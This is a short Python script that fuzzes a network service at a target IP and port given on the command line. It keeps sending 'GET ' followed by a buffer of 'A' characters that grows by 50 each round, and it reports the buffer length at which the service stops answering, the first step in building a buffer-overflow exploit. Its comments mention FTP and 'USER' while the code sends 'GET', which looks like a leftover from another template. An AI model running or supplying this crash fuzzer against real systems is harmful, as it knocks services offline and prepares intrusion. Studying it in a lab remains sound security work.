#!/usr/bin/python

from core import *
import sys
from time import sleep

param = sys.argv
ip = sys.argv[1]
port = sys.argv[2]
print("Target => ",ip)
print("Port => ",port)

#i = sys.argv[3]

buffer = '\x41'* 50

# loop through sending in a buffer with an increasing length by 50 A's
while True:
  # The "try - except" catches the programs error and takes our defined action
  try:
    # Make a connection to target system on TCP/21
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ip,int(port) ))
    s.send("Yo".encode())
    s.recv(1024)
 
    print("Sending buffer with length: "+str(len(buffer)))
    # Send in string 'USER' + the string 'buff'
    s.send("GET ".encode()+buffer.encode()+"\r\n".encode())
    s.close()
    sleep(1)
    # Increase the buff string by 50 A's and then the loop continues
    buffer = buffer + '\x41'*50
 
  except: # If we fail to connect to the server, we assume its crashed and print the statement below
    print("[+] Crash occured with buffer length: "+str(len(buffer)-50))
    print("Service potentialy crashed..... check debugger")
    sys.exit()
